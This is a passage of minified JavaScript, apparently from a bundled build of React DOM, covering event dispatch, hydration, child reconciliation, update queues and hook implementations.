e;if((v||m)&&(m=g.window===g?g:(m=g.ownerDocument)?m.defaultView||m.parentWindow:window,v?(w=t.relatedTarget||t.toElement,v=c,w=w?Pn(w):null,w!==null&&(E=zn(w),w!==E||w.tag!==5&&w.tag!==6)&&(w=null)):(v=null,w=c),v!==w)){if(k=ys,y="onMouseLeave",f="onMouseEnter",d="mouse",(e==="pointerout"||e==="pointerover")&&(k=ks,y="onPointerLeave",f="onPointerEnter",d="pointer"),E=v==null?m:Gn(v),p=w==null?m:Gn(w),m=new k(y,d+"leave",v,t,g),m.target=E,m.relatedTarget=p,y=null,Pn(g)===c&&(k=new k(f,d+"enter",w,t,g),k.target=p,k.relatedTarget=E,y=k),E=y,v&&w)n:{for(k=v,f=w,d=0,p=k;p;p=Fn(p))d++;for(p=0,y=f;y;y=Fn(y))p++;for(;0<d-p;)k=Fn(k),d--;for(;0<p-d;)f=Fn(f),p--;for(;d--;){if(k===f||f!==null&&k===f.alternate)break n;k=Fn(k),f=Fn(f)}k=null}else k=null;v!==null&&Os(h,m,v,k,!1),w!==null&&E!==null&&Os(h,E,w,k,!0)}}e:{if(m=c?Gn(c):window,v=m.nodeName&&m.nodeName.toLowerCase(),v==="select"||v==="input"&&m.type==="file")var b=Cf;else if(bs(m))if(yu)b=Nf;else{b=Pf;var P=Tf}else(v=m.nodeName)&&v.toLowerCase()==="input"&&(m.type==="checkbox"||m.type==="radio")&&(b=_f);if(b&&(b=b(e,c))){vu(h,b,t,g);break e}P&&P(e,m,c),e==="focusout"&&(P=m._wrapperState)&&P.controlled&&m.type==="number"&&hl(m,"number",m.value)}switch(P=c?Gn(c):window,e){case"focusin":(bs(P)||P.contentEditable==="true")&&(Wn=P,Tl=c,At=null);break;case"focusout":At=Tl=Wn=null;break;case"mousedown":Pl=!0;break;case"contextmenu":case"mouseup":case"dragend":Pl=!1,_s(h,t,g);break;case"selectionchange":if(jf)break;case"keydown":case"keyup":_s(h,t,g)}var _;if(So)e:{switch(e){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else Vn?mu(e,t)&&(N="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(N="onCompositionStart");N&&(hu&&t.locale!=="ko"&&(Vn||N!=="onCompositionStart"?N==="onCompositionEnd"&&Vn&&(_=pu()):(rn=g,wo="value"in rn?rn.value:rn.textContent,Vn=!0)),P=Yr(c,N),0<P.length&&(N=new ws(N,e,null,t,g),h.push({event:N,listeners:P}),_?N.data=_:(_=gu(t),_!==null&&(N.data=_)))),(_=kf?xf(e,t):Sf(e,t))&&(c=Yr(c,"onBeforeInput"),0<c.length&&(g=new ws("onBeforeInput","beforeinput",null,t,g),h.push({event:g,listeners:c}),g.data=_))}_u(h,n)})}function Kt(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Yr(e,n){for(var t=n+"Capture",r=[];e!==null;){var i=e,l=i.stateNode;i.tag===5&&l!==null&&(i=l,l=Ut(e,t),l!=null&&r.unshift(Kt(e,l,i)),l=Ut(e,n),l!=null&&r.push(Kt(e,l,i))),e=e.return}return r}function Fn(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Os(e,n,t,r,i){for(var l=n._reactName,o=[];t!==null&&t!==r;){var s=t,a=s.alternate,c=s.stateNode;if(a!==null&&a===r)break;s.tag===5&&c!==null&&(s=c,i?(a=Ut(t,l),a!=null&&o.unshift(Kt(t,a,s))):i||(a=Ut(t,l),a!=null&&o.push(Kt(t,a,s)))),t=t.return}o.length!==0&&e.push({event:n,listeners:o})}var If=/\r\n?/g,Df=/\u0000|\uFFFD/g;function js(e){return(typeof e=="string"?e:""+e).replace(If,`
`).replace(Df,"")}function br(e,n,t){if(n=js(n),js(e)!==n&&t)throw Error(x(425))}function Xr(){}var _l=null,Nl=null;function Ll(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Ol=typeof setTimeout=="function"?setTimeout:void 0,zf=typeof clearTimeout=="function"?clearTimeout:void 0,Rs=typeof Promise=="function"?Promise:void 0,Bf=typeof queueMicrotask=="function"?queueMicrotask:typeof Rs<"u"?function(e){return Rs.resolve(null).then(e).catch(Ff)}:Ol;function Ff(e){setTimeout(function(){throw e})}function Xi(e,n){var t=n,r=0;do{var i=t.nextSibling;if(e.removeChild(t),i&&i.nodeType===8)if(t=i.data,t==="/$"){if(r===0){e.removeChild(i),Wt(n);return}r--}else t!=="$"&&t!=="$?"&&t!=="$!"||r++;t=i}while(t);Wt(n)}function cn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function As(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var ht=Math.random().toString(36).slice(2),ze="__reactFiber$"+ht,Yt="__reactProps$"+ht,Ke="__reactContainer$"+ht,jl="__reactEvents$"+ht,Uf="__reactListeners$"+ht,Hf="__reactHandles$"+ht;function Pn(e){var n=e[ze];if(n)return n;for(var t=e.parentNode;t;){if(n=t[Ke]||t[ze]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=As(e);e!==null;){if(t=e[ze])return t;e=As(e)}return n}e=t,t=e.parentNode}return null}function sr(e){return e=e[ze]||e[Ke],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Gn(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(x(33))}function yi(e){return e[Yt]||null}var Rl=[],Qn=-1;function wn(e){return{current:e}}function z(e){0>Qn||(e.current=Rl[Qn],Rl[Qn]=null,Qn--)}function I(e,n){Qn++,Rl[Qn]=e.current,e.current=n}var vn={},oe=wn(vn),pe=wn(!1),jn=vn;function ot(e,n){var t=e.type.contextTypes;if(!t)return vn;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===n)return r.__reactInternalMemoizedMaskedChildContext;var i={},l;for(l in t)i[l]=n[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=i),i}function he(e){return e=e.childContextTypes,e!=null}function qr(){z(pe),z(oe)}function Ms(e,n,t){if(oe.current!==vn)throw Error(x(168));I(oe,n),I(pe,t)}function Lu(e,n,t){var r=e.stateNode;if(n=n.childContextTypes,typeof r.getChildContext!="function")return t;r=r.getChildContext();for(var i in r)if(!(i in n))throw Error(x(108,Cd(e)||"Unknown",i));return H({},t,r)}function Jr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||vn,jn=oe.current,I(oe,e),I(pe,pe.current),!0}function Is(e,n,t){var r=e.stateNode;if(!r)throw Error(x(169));t?(e=Lu(e,n,jn),r.__reactInternalMemoizedMergedChildContext=e,z(pe),z(oe),I(oe,e)):z(pe),I(pe,t)}var Ve=null,wi=!1,qi=!1;function Ou(e){Ve===null?Ve=[e]:Ve.push(e)}function Vf(e){wi=!0,Ou(e)}function kn(){if(!qi&&Ve!==null){qi=!0;var e=0,n=M;try{var t=Ve;for(M=1;e<t.length;e++){var r=t[e];do r=r(!0);while(r!==null)}Ve=null,wi=!1}catch(i){throw Ve!==null&&(Ve=Ve.slice(e+1)),tu(mo,kn),i}finally{M=n,qi=!1}}return null}var Kn=[],Yn=0,Zr=null,ei=0,Se=[],be=0,Rn=null,We=1,$e="";function En(e,n){Kn[Yn++]=ei,Kn[Yn++]=Zr,Zr=e,ei=n}function ju(e,n,t){Se[be++]=We,Se[be++]=$e,Se[be++]=Rn,Rn=e;var r=We;e=$e;var i=32-Re(r)-1;r&=~(1<<i),t+=1;var l=32-Re(n)+i;if(30<l){var o=i-i%5;l=(r&(1<<o)-1).toString(32),r>>=o,i-=o,We=1<<32-Re(n)+i|t<<i|r,$e=l+e}else We=1<<l|t<<i|r,$e=e}function Eo(e){e.return!==null&&(En(e,1),ju(e,1,0))}function Co(e){for(;e===Zr;)Zr=Kn[--Yn],Kn[Yn]=null,ei=Kn[--Yn],Kn[Yn]=null;for(;e===Rn;)Rn=Se[--be],Se[be]=null,$e=Se[--be],Se[be]=null,We=Se[--be],Se[be]=null}var ye=null,ve=null,B=!1,je=null;function Ru(e,n){var t=Ee(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function Ds(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,ye=e,ve=cn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,ye=e,ve=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=Rn!==null?{id:We,overflow:$e}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Ee(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,ye=e,ve=null,!0):!1;default:return!1}}function Al(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Ml(e){if(B){var n=ve;if(n){var t=n;if(!Ds(e,n)){if(Al(e))throw Error(x(418));n=cn(t.nextSibling);var r=ye;n&&Ds(e,n)?Ru(r,t):(e.flags=e.flags&-4097|2,B=!1,ye=e)}}else{if(Al(e))throw Error(x(418));e.flags=e.flags&-4097|2,B=!1,ye=e}}}function zs(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ye=e}function Er(e){if(e!==ye)return!1;if(!B)return zs(e),B=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Ll(e.type,e.memoizedProps)),n&&(n=ve)){if(Al(e))throw Au(),Error(x(418));for(;n;)Ru(e,n),n=cn(n.nextSibling)}if(zs(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(x(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){ve=cn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}ve=null}}else ve=ye?cn(e.stateNode.nextSibling):null;return!0}function Au(){for(var e=ve;e;)e=cn(e.nextSibling)}function st(){ve=ye=null,B=!1}function To(e){je===null?je=[e]:je.push(e)}var Wf=qe.ReactCurrentBatchConfig;function bt(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(x(309));var r=t.stateNode}if(!r)throw Error(x(147,e));var i=r,l=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===l?n.ref:(n=function(o){var s=i.refs;o===null?delete s[l]:s[l]=o},n._stringRef=l,n)}if(typeof e!="string")throw Error(x(284));if(!t._owner)throw Error(x(290,e))}return e}function Cr(e,n){throw e=Object.prototype.toString.call(n),Error(x(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Bs(e){var n=e._init;return n(e._payload)}function Mu(e){function n(f,d){if(e){var p=f.deletions;p===null?(f.deletions=[d],f.flags|=16):p.push(d)}}function t(f,d){if(!e)return null;for(;d!==null;)n(f,d),d=d.sibling;return null}function r(f,d){for(f=new Map;d!==null;)d.key!==null?f.set(d.key,d):f.set(d.index,d),d=d.sibling;return f}function i(f,d){return f=hn(f,d),f.index=0,f.sibling=null,f}function l(f,d,p){return f.index=p,e?(p=f.alternate,p!==null?(p=p.index,p<d?(f.flags|=2,d):p):(f.flags|=2,d)):(f.flags|=1048576,d)}function o(f){return e&&f.alternate===null&&(f.flags|=2),f}function s(f,d,p,y){return d===null||d.tag!==6?(d=il(p,f.mode,y),d.return=f,d):(d=i(d,p),d.return=f,d)}function a(f,d,p,y){var b=p.type;return b===Hn?g(f,d,p.props.children,y,p.key):d!==null&&(d.elementType===b||typeof b=="object"&&b!==null&&b.$$typeof===Ze&&Bs(b)===d.type)?(y=i(d,p.props),y.ref=bt(f,d,p),y.return=f,y):(y=Ur(p.type,p.key,p.props,null,f.mode,y),y.ref=bt(f,d,p),y.return=f,y)}function c(f,d,p,y){return d===null||d.tag!==4||d.stateNode.containerInfo!==p.containerInfo||d.stateNode.implementation!==p.implementation?(d=ll(p,f.mode,y),d.return=f,d):(d=i(d,p.children||[]),d.return=f,d)}function g(f,d,p,y,b){return d===null||d.tag!==7?(d=On(p,f.mode,y,b),d.return=f,d):(d=i(d,p),d.return=f,d)}function h(f,d,p){if(typeof d=="string"&&d!==""||typeof d=="number")return d=il(""+d,f.mode,p),d.return=f,d;if(typeof d=="object"&&d!==null){switch(d.$$typeof){case hr:return p=Ur(d.type,d.key,d.props,null,f.mode,p),p.ref=bt(f,null,d),p.return=f,p;case Un:return d=ll(d,f.mode,p),d.return=f,d;case Ze:var y=d._init;return h(f,y(d._payload),p)}if(Pt(d)||yt(d))return d=On(d,f.mode,p,null),d.return=f,d;Cr(f,d)}return null}function m(f,d,p,y){var b=d!==null?d.key:null;if(typeof p=="string"&&p!==""||typeof p=="number")return b!==null?null:s(f,d,""+p,y);if(typeof p=="object"&&p!==null){switch(p.$$typeof){case hr:return p.key===b?a(f,d,p,y):null;case Un:return p.key===b?c(f,d,p,y):null;case Ze:return b=p._init,m(f,d,b(p._payload),y)}if(Pt(p)||yt(p))return b!==null?null:g(f,d,p,y,null);Cr(f,p)}return null}function v(f,d,p,y,b){if(typeof y=="string"&&y!==""||typeof y=="number")return f=f.get(p)||null,s(d,f,""+y,b);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case hr:return f=f.get(y.key===null?p:y.key)||null,a(d,f,y,b);case Un:return f=f.get(y.key===null?p:y.key)||null,c(d,f,y,b);case Ze:var P=y._init;return v(f,d,p,P(y._payload),b)}if(Pt(y)||yt(y))return f=f.get(p)||null,g(d,f,y,b,null);Cr(d,y)}return null}function w(f,d,p,y){for(var b=null,P=null,_=d,N=d=0,W=null;_!==null&&N<p.length;N++){_.index>N?(W=_,_=null):W=_.sibling;var R=m(f,_,p[N],y);if(R===null){_===null&&(_=W);break}e&&_&&R.alternate===null&&n(f,_),d=l(R,d,N),P===null?b=R:P.sibling=R,P=R,_=W}if(N===p.length)return t(f,_),B&&En(f,N),b;if(_===null){for(;N<p.length;N++)_=h(f,p[N],y),_!==null&&(d=l(_,d,N),P===null?b=_:P.sibling=_,P=_);return B&&En(f,N),b}for(_=r(f,_);N<p.length;N++)W=v(_,f,N,p[N],y),W!==null&&(e&&W.alternate!==null&&_.delete(W.key===null?N:W.key),d=l(W,d,N),P===null?b=W:P.sibling=W,P=W);return e&&_.forEach(function(_e){return n(f,_e)}),B&&En(f,N),b}function k(f,d,p,y){var b=yt(p);if(typeof b!="function")throw Error(x(150));if(p=b.call(p),p==null)throw Error(x(151));for(var P=b=null,_=d,N=d=0,W=null,R=p.next();_!==null&&!R.done;N++,R=p.next()){_.index>N?(W=_,_=null):W=_.sibling;var _e=m(f,_,R.value,y);if(_e===null){_===null&&(_=W);break}e&&_&&_e.alternate===null&&n(f,_),d=l(_e,d,N),P===null?b=_e:P.sibling=_e,P=_e,_=W}if(R.done)return t(f,_),B&&En(f,N),b;if(_===null){for(;!R.done;N++,R=p.next())R=h(f,R.value,y),R!==null&&(d=l(R,d,N),P===null?b=R:P.sibling=R,P=R);return B&&En(f,N),b}for(_=r(f,_);!R.done;N++,R=p.next())R=v(_,f,N,R.value,y),R!==null&&(e&&R.alternate!==null&&_.delete(R.key===null?N:R.key),d=l(R,d,N),P===null?b=R:P.sibling=R,P=R);return e&&_.forEach(function(gt){return n(f,gt)}),B&&En(f,N),b}function E(f,d,p,y){if(typeof p=="object"&&p!==null&&p.type===Hn&&p.key===null&&(p=p.props.children),typeof p=="object"&&p!==null){switch(p.$$typeof){case hr:e:{for(var b=p.key,P=d;P!==null;){if(P.key===b){if(b=p.type,b===Hn){if(P.tag===7){t(f,P.sibling),d=i(P,p.props.children),d.return=f,f=d;break e}}else if(P.elementType===b||typeof b=="object"&&b!==null&&b.$$typeof===Ze&&Bs(b)===P.type){t(f,P.sibling),d=i(P,p.props),d.ref=bt(f,P,p),d.return=f,f=d;break e}t(f,P);break}else n(f,P);P=P.sibling}p.type===Hn?(d=On(p.props.children,f.mode,y,p.key),d.return=f,f=d):(y=Ur(p.type,p.key,p.props,null,f.mode,y),y.ref=bt(f,d,p),y.return=f,f=y)}return o(f);case Un:e:{for(P=p.key;d!==null;){if(d.key===P)if(d.tag===4&&d.stateNode.containerInfo===p.containerInfo&&d.stateNode.implementation===p.implementation){t(f,d.sibling),d=i(d,p.children||[]),d.return=f,f=d;break e}else{t(f,d);break}else n(f,d);d=d.sibling}d=ll(p,f.mode,y),d.return=f,f=d}return o(f);case Ze:return P=p._init,E(f,d,P(p._payload),y)}if(Pt(p))return w(f,d,p,y);if(yt(p))return k(f,d,p,y);Cr(f,p)}return typeof p=="string"&&p!==""||typeof p=="number"?(p=""+p,d!==null&&d.tag===6?(t(f,d.sibling),d=i(d,p),d.return=f,f=d):(t(f,d),d=il(p,f.mode,y),d.return=f,f=d),o(f)):t(f,d)}return E}var at=Mu(!0),Iu=Mu(!1),ni=wn(null),ti=null,Xn=null,Po=null;function _o(){Po=Xn=ti=null}function No(e){var n=ni.current;z(ni),e._currentValue=n}function Il(e,n,t){for(;e!==null;){var r=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,r!==null&&(r.childLanes|=n)):r!==null&&(r.childLanes&n)!==n&&(r.childLanes|=n),e===t)break;e=e.return}}function rt(e,n){ti=e,Po=Xn=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(fe=!0),e.firstContext=null)}function Te(e){var n=e._currentValue;if(Po!==e)if(e={context:e,memoizedValue:n,next:null},Xn===null){if(ti===null)throw Error(x(308));Xn=e,ti.dependencies={lanes:0,firstContext:e}}else Xn=Xn.next=e;return n}var _n=null;function Lo(e){_n===null?_n=[e]:_n.push(e)}function Du(e,n,t,r){var i=n.interleaved;return i===null?(t.next=t,Lo(n)):(t.next=i.next,i.next=t),n.interleaved=t,Ye(e,r)}function Ye(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var en=!1;function Oo(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function zu(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ge(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function dn(e,n,t){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,A&2){var i=r.pending;return i===null?n.next=n:(n.next=i.next,i.next=n),r.pending=n,Ye(e,t)}return i=r.interleaved,i===null?(n.next=n,Lo(r)):(n.next=i.next,i.next=n),r.interleaved=n,Ye(e,t)}function Mr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var r=n.lanes;r&=e.pendingLanes,t|=r,n.lanes=t,go(e,t)}}function Fs(e,n){var t=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,t===r)){var i=null,l=null;if(t=t.firstBaseUpdate,t!==null){do{var o={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};l===null?i=l=o:l=l.next=o,t=t.next}while(t!==null);l===null?i=l=n:l=l.next=n}else i=l=n;t={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function ri(e,n,t,r){var i=e.updateQueue;en=!1;var l=i.firstBaseUpdate,o=i.lastBaseUpdate,s=i.shared.pending;if(s!==null){i.shared.pending=null;var a=s,c=a.next;a.next=null,o===null?l=c:o.next=c,o=a;var g=e.alternate;g!==null&&(g=g.updateQueue,s=g.lastBaseUpdate,s!==o&&(s===null?g.firstBaseUpdate=c:s.next=c,g.lastBaseUpdate=a))}if(l!==null){var h=i.baseState;o=0,g=c=a=null,s=l;do{var m=s.lane,v=s.eventTime;if((r&m)===m){g!==null&&(g=g.next={eventTime:v,lane:0,tag:s.tag,payload:s.payload,callback:s.callback,next:null});e:{var w=e,k=s;switch(m=n,v=t,k.tag){case 1:if(w=k.payload,typeof w=="function"){h=w.call(v,h,m);break e}h=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=k.payload,m=typeof w=="function"?w.call(v,h,m):w,m==null)break e;h=H({},h,m);break e;case 2:en=!0}}s.callback!==null&&s.lane!==0&&(e.flags|=64,m=i.effects,m===null?i.effects=[s]:m.push(s))}else v={eventTime:v,lane:m,tag:s.tag,payload:s.payload,callback:s.callback,next:null},g===null?(c=g=v,a=h):g=g.next=v,o|=m;if(s=s.next,s===null){if(s=i.shared.pending,s===null)break;m=s,s=m.next,m.next=null,i.lastBaseUpdate=m,i.shared.pending=null}}while(!0);if(g===null&&(a=h),i.baseState=a,i.firstBaseUpdate=c,i.lastBaseUpdate=g,n=i.shared.interleaved,n!==null){i=n;do o|=i.lane,i=i.next;while(i!==n)}else l===null&&(i.shared.lanes=0);Mn|=o,e.lanes=o,e.memoizedState=h}}function Us(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var r=e[n],i=r.callback;if(i!==null){if(r.callback=null,r=t,typeof i!="function")throw Error(x(191,i));i.call(r)}}}var ar={},Fe=wn(ar),Xt=wn(ar),qt=wn(ar);function Nn(e){if(e===ar)throw Error(x(174));return e}function jo(e,n){switch(I(qt,n),I(Xt,e),I(Fe,ar),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:gl(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=gl(n,e)}z(Fe),I(Fe,n)}function ut(){z(Fe),z(Xt),z(qt)}function Bu(e){Nn(qt.current);var n=Nn(Fe.current),t=gl(n,e.type);n!==t&&(I(Xt,e),I(Fe,t))}function Ro(e){Xt.current===e&&(z(Fe),z(Xt))}var F=wn(0);function ii(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Ji=[];function Ao(){for(var e=0;e<Ji.length;e++)Ji[e]._workInProgressVersionPrimary=null;Ji.length=0}var Ir=qe.ReactCurrentDispatcher,Zi=qe.ReactCurrentBatchConfig,An=0,U=null,Y=null,J=null,li=!1,Mt=!1,Jt=0,$f=0;function re(){throw Error(x(321))}function Mo(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Me(e[t],n[t]))return!1;return!0}function Io(e,n,t,r,i,l){if(An=l,U=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Ir.current=e===null||e.memoizedState===null?Yf:Xf,e=t(r,i),Mt){l=0;do{if(Mt=!1,Jt=0,25<=l)throw Error(x(301));l+=1,J=Y=null,n.updateQueue=null,Ir.current=qf,e=t(r,i)}while(Mt)}if(Ir.current=oi,n=Y!==null&&Y.next!==null,An=0,J=Y=U=null,li=!1,n)throw Error(x(300));return e}function Do(){var e=Jt!==0;return Jt=0,e}function De(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return J===null?U.memoizedState=J=e:J=J.next=e,J}function Pe(){if(Y===null){var e=U.alternate;e=e!==null?e.memoizedState:null}else e=Y.next;var n=J===null?U.memoizedState:J.next;if(n!==null)J=n,Y=e;else{if(e===null)throw Error(x(310));Y=e,e={memoizedState:Y.memoizedState,baseState:Y.baseState,baseQueue:Y.baseQueue,queue:Y.queue,next:null},J===null?U.memoizedState=J=e:J=J.next=e}return J}function Zt(e,n){return typeof n=="function"?n(e):n}function el(e){var n=Pe(),t=n.queue;if(t===null)throw Error(x(311));t.lastRenderedReducer=e;var r=Y,i=r.baseQueue,l=t.pending;if(l!==null){if(i!==null){var o=i.next;i.next=l.next,l.next=o}r.baseQueue=i=l,t.pending=null}if(i!==null){l=i.next,r=r.baseState;var s=o=null,a=null,c=l;do{var g=c.lane;if((An&g)===g)a!==null&&(a=a.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),r=c.hasEagerState?c.eagerState:e(r,c.action);else{var h={lane:g,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};a===null?(s=a=h,o=r):a=a.next=h,U.lanes|=g,Mn|=g}c=c.next}while(c!==null&&c!==l);a===null?o=r:a.next=s,Me(r,n.memoizedState)||(fe=!0),n.memoizedState=r,n.baseState=o,n.baseQueue=a,t.lastRenderedState=r}if(e=t.interleaved,e!==null){i=e;do l=i.lane,U.lanes|=l,Mn|=l,i=i.next;while(i!==e)}else i===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function nl(e){var n=Pe(),t=n.queue;if(t===null)throw Error(x(311));t.lastRenderedReducer=e;var r=t.dispatch,i=t.pending,l=n.memoizedState;if(i!==null){t.pending=null;var o=i=i.next;do l=e(l,o.action),o=o.next;while(o!==i);Me(l,n.memoizedState)||(fe=!0),n.memoizedState=l,n.baseQueue===null&&(n.baseState=l),t.lastRenderedState=l}return[l,r]}function Fu(){}function Uu(e,n){var t=U,r=Pe(),i=n(),l=!Me(r.memoizedState,i);if(l&&(r.memoizedState=i,fe=!0),r=r.queue,zo(Wu.bind(null,t,r,e),[e]),r.getSnapshot!==n||l||J!==null&&J.memoizedState.tag&1){if(t.flags|=2048,er(9,Vu.bind(null,t,r,i,n),void 0,null),Z===null)throw Error(x(349));An&30||Hu(t,n,i)}return i}function Hu(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=U.updateQueue,n===null?(n={lastEffect:null,stores:null},U.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Vu(e,n,t,r){n.value=t,n.getSnapshot=r,$u(n)&&Gu(e)}function Wu(e,n,t){return t(function(){$u(n)&&Gu(e)})}function $u(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Me(e,t)}catch{return!0}}function Gu(e){var n=Ye(e,1);n!==null&&Ae(n,e,1,-1)}function Hs(e){var n=De();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Zt,lastRenderedState:e},n.queue=e,e=e.dispatch=Kf.bind(null,U,e),[n.memoizedState,e]}function er(e,n,t,r){return e={tag:e,create:n,destroy:t,deps:r,next:null},n=U.updateQueue,n===null?(n={lastEffect:null,stores:null},U.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(r=t.next,t.next=e,e.next=r,n.lastEffect=e)),e}function Qu(){return Pe().memoizedState}function Dr(e,n,t,r){var i=De();U.flags|=e,i.memoizedState=er(1|n,t,void 0,r===void 0?null:r)}function ki(e,n,t,r){var i=Pe();r=r===void 0?null:r;var l=void 0;if(Y!==null){var o=Y.memoizedState;if(l=o.destroy,r!==null&&Mo(r,o.deps)){i.memoizedState=er(n,t,l,r);return}}U.flags|=e,i.memoizedState=er(1|n,t,l,r)}function Vs(e,n){return Dr(8390656,8,e,n)}function zo(e,n){return ki(2048,8,e,n)}function Ku(e,n){return ki(4,2,e,n)}function Yu(e,n){return ki(4,4,e,n)}function Xu(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function qu(e,n,t){return t=t!=null?t.concat([e]):null,ki(4,4,Xu.bind(null,n,e),t)}function Bo(){}function Ju(e,n){var t=Pe();n=n===void 0?null:n;var r=t.memoizedState;return r!==null&&n!==null&&Mo(n,r[1])?r[0]:(t.memoizedState=[e,n],e)}function Zu(e,n){var t=Pe();n=n===void 0?null:n;var r=t.memoizedState;return r!==null&&n!==null&&Mo(n,r[1])?r[0]:(e=e(),t.memoizedState=[e,n],e)}function ec(e,n,t){return An&21?(Me(t,n)||(t=lu(),U.lanes|=t,Mn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,fe=!0),e.memoizedState=t)}function Gf(e,n){var t=M;M=t!==0&&4>t?t:4,e(!0);var r=Zi.transition;Zi.transition={};try{e(!1),n()}finally{M=t,Zi.transition=r}}function nc(){return Pe().memoizedState}function Qf(e,n,t){var r=pn(e);if(t={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null},tc(e))rc(n,t);else if(t=Du(e,n,t,r),t!==null){var i=ae();Ae(t,e,r,i),ic(t,n,r)}}function Kf(e,n,t){var r=pn(e),i={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null};if(tc(e))rc(n,i);else{var 